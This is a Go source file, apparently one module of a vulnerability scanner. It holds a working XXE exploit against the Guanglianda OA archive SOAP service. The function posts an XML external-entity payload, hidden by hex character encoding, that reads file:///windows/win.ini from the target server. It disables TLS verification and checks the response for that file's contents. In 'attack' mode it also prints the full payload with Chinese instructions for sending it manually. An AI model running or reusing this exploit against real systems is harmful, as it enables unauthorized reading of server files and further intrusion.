package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func GuangLianDaOA_XXE(url string, Attack bool) error {
	payload := `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <PostArchiveInfo xmlns="http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx">
      <archiveInfo>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x20;&#x5b;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x73;&#x2f;&#x77;&#x69;&#x6e;&#x2e;&#x69;&#x6e;&#x69;&#x22;&#x3e;&#xa;&#x5d;&#x3e;&#xa;&#xa;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#xa;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#xa;&#xa;&#xa;&#x26;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x3b;&#xa;&#xa;&#xa;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#xa;&#x3c;&#x2f;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x44;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x20;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3c;&#x2f;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x31;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x31;&#x2e;&#x30;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;&#xa;</archiveInfo>
      <folderIdList>string</folderIdList>
      <platId>string</platId>
    </PostArchiveInfo>
  </soap:Body>
</soap:Envelope>`

	payload = strings.ReplaceAll(payload, "\n", "\r\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/GB/LK/Document/ArchiveService/ArchiveWebService.asmx", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "text/xml; charset=utf-8")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "for 16-bit") {
		fmt.Println("[*]广联达OA_XXE : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/GB/LK/Document/ArchiveService/ArchiveWebService.asmx，并传入请求体`<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <PostArchiveInfo xmlns=\"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx\">\n      <archiveInfo>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x20;&#x5b;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x73;&#x2f;&#x77;&#x69;&#x6e;&#x2e;&#x69;&#x6e;&#x69;&#x22;&#x3e;&#xa;&#x5d;&#x3e;&#xa;&#xa;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#xa;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#xa;&#xa;&#xa;&#x26;&#x73;&#x65;&#x63;&#x72;&#x65;&#x74;&#x3b;&#xa;&#xa;&#xa;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#x23;&#xa;&#x3c;&#x2f;&#x55;&#x70;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x49;&#x44;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x44;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x20;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3c;&#x2f;&#x4d;&#x61;&#x69;&#x6e;&#x44;&#x6f;&#x63;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x52;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x31;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x54;&#x79;&#x70;&#x65;&#x49;&#x44;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x31;&#x2e;&#x30;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3e;&#x20;&#x20;&#xa;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x44;&#x6f;&#x63;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x20;&#x20;&#xa;&#x3c;&#x2f;&#x41;&#x72;&#x63;&#x68;&#x69;&#x76;&#x65;&#x3e;&#xa;</archiveInfo>\n      <folderIdList>string</folderIdList>\n      <platId>string</platId>\n    </PostArchiveInfo>\n  </soap:Body>\n</soap:Envelope>`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
